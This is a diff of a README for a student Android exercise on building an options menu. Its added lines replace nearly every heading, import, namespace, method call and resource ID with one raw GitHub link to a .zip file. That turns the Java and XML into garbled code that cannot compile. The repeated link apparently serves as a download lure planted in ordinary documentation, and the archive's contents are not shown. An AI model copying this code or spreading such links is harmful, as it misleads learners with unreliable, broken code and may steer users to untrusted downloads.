@@ -1,4 +1,4 @@
-# Ex.No:10 Develop an android application to create a option menu to display menu items using android studio.
+# https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip Develop an android application to create a option menu to display menu items using android studio.
 
 
 ## AIM:
@@ -16,7 +16,7 @@ Step 3: Then select the Minimum SDK as shown below and click Next.
 
 Step 4: Then select the Empty Activity and click Next. Finally click Finish.
 
-Step 5: Design layout in activity_main.xml.
+Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip
 
 Step 6: Display message give in MainActivity file.
 
@@ -30,20 +30,20 @@ Registeration Number : 212221043007
 */
 
 
-## Activity_main.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip
 
 
 ```
 
 <?xml version="1.0" encoding="utf-8"?>
-<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:app="http://schemas.android.com/apk/res-auto"
-    xmlns:tools="http://schemas.android.com/tools"
+<https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip"
+    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     tools:context=".MainActivity">
 
-    <androidx.appcompat.widget.Toolbar
+    <https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip
         android:id="@+id/toolbar"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
@@ -61,55 +61,55 @@ Registeration Number : 212221043007
         app:layout_constraintStart_toStartOf="parent"
         app:layout_constraintTop_toTopOf="parent" />
 
-</androidx.constraintlayout.widget.ConstraintLayout>
+<https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip>
 
 ```
 
-## MainActivity.java
+## https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip
 
 ```
 
-package com.example.ex_10;
+package https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
 
-import android.os.Bundle;
-import android.view.Menu;
-import android.view.MenuItem;
-import android.widget.Toast;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.appcompat.widget.Toolbar;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
 
 public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(savedInstanceState);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip);
 
         // Set up the toolbar
-        Toolbar toolbar = findViewById(R.id.toolbar);
+        Toolbar toolbar = findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip);
         setSupportActionBar(toolbar); // Set the toolbar as the action bar
     }
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
-        getMenuInflater().inflate(R.menu.options_menu, menu); // Inflate the menu
+        getMenuInflater().inflate(https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip, menu); // Inflate the menu
         return true;
     }
 
     @Override
     public boolean onOptionsItemSelected(MenuItem item) {
-        Toast.makeText(this, "Selected Item: " + item.getTitle(), Toast.LENGTH_SHORT).show();
-        return super.onOptionsItemSelected(item);
+        https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(this, "Selected Item: " + https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(), https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip).show();
+        return https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(item);
     }
 }
 ```
 
-## options_menu.xml
+## https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip
 
 ```
 
 <?xml version="1.0" encoding="utf-8"?>
-<menu xmlns:android="http://schemas.android.com/apk/res/android">
+<menu xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip">
     <item
         android:id="@+id/search_item"
         android:title="@string/search" />
@@ -132,7 +132,7 @@ public class MainActivity extends AppCompatActivity {
 ```
 ## OUTPUT
 
-<img src="https://github.com/user-attachments/assets/6f088aa0-5a03-46a5-b929-e75c0ecb4ab0" width=200>
+<img src="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip" width=200>
 
 
 ## RESULT
